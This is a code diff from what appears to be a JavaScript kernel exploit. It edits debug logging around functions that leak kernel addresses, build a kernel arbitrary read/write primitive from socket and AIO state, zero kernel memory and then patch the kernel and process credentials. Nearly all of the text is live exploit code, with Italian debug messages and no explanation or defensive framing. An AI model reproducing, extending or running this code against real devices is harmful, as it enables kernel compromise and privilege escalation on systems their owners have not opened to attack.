@@ -902,13 +902,7 @@ function leak_kernel_addrs(sd_pair) {
 
         free_aios(leak_ids_p, leak_ids_len);
 
-   //     log("test2_________");
-   //  debug_aio_memory_state(pktopts_sds[0], kmem, reqs1_addr, "Post-free AIO");
-
-
-//debug_aio_memory_state(pktopts_sds[0], kmem, reqs1_addr, "Post-free AIO");
-        
-        log("test2_________");
+ 
     }
     if (reqs2_off === null) {
         die('could not leak a reqs2');
@@ -1700,31 +1694,21 @@ function zero_out_memory(kmem, addr, size = 0x80) {
 
 
 function debug_aio_memory_state(sd, kmem, addr, label = "AIO") {
-    //log(`--- ${label} memory dump ---`);
+   log(`--- ${label} memory dump @ 0x${addr.toString(16)} ---`);
+  try {
+   
+    const buf = new Buffer(0x80);
 
-    log('___________________TEST___________________________________');
-    try {
-        const buf = new Buffer(0x80);
-        kmem.copyout(addr, buf.addr, buf.size);
-        hexdump(buf);
-    } catch (e) {
-        log(`Errore durante la lettura memoria AIO: ${e}`);
-        
-    }
-
-
-        zero_out_memory(kmem, reqs1_addr);
-    log("________FREEE________");
-     try {
-        const buf = new Buffer(0x80);
-        kmem.copyout(addr, buf.addr, buf.size);
-        hexdump(buf);
-    } catch (e) {
-        log(`Errore durante la lettura memoria AIO: ${e}`);
-        
-    }
     
-   log('___________________TEST___________________________________');
+    kmem.copyout(addr, buf.addr, buf.size);
+
+    // Stampo in hexdump il contenuto del Buffer
+    hexdump(buf);
+  } catch (e) {
+    log(`Errore durante la lettura memoria AIO: ${e}`);
+  }
+    
+ // log('___________________TEST___________________________________');
     
 }
 
@@ -1807,7 +1791,16 @@ export async function kexploit() {
         const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
 
-        debug_aio_memory_state(pktopts_sds[0], kmem, reqs1_addr, "Post-free AIO");
+
+  log('___________________TEST___________________________________');
+        debug_aio_memory_state(pktopts_sds[0], kmem, reqs1_addr, "prima");
+       zero_out_memory(kmem, reqs1_addr);
+    debug_aio_memory_state(pktopts_sds[0], kmem, reqs1_addr, "Dopo pulizia");
+
+
+          log('___________________TEST___________________________________');
+
+       // debug_aio_memory_state(pktopts_sds[0], kmem, reqs1_addr, "Post-free AIO");
         
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
